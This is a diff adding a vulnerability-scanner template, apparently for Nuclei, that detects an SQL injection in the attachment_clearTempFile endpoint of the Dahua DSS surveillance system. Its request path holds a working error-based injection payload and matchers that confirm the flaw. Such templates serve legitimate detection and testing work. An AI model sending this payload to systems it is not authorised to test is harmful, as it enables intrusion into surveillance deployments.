@@ -1,0 +1,29 @@
+id: dahua-dss-attachment-cleartempfile-sqli
+info:
+  name: Dahua DSS Digital Surveillance System attachment_clearTempFile SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects a SQL Injection vulnerability in Dahua DSS Digital Surveillance System's `attachment_clearTempFile` endpoint. It exploits a SQL injection flaw to retrieve the MD5 hash of a random integer.
+
+variables:
+  t1: "{{rand_int(10000,99999)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: GET
+    path:
+      - "/portal/attachment_clearTempFile.action?bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,CONCAT(0x5c,0x716b6b6b71,(SELECT%20(md5({{t1}}))),0x7178786271))%20AND%20(%27mYhO%27=%27mYhO&bean.TabName=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "XPATH syntax error"
+          - "org.springframework.jdbc"
+      - type: word
+        words:
+          - "{{substr(t2,0,26)}}"
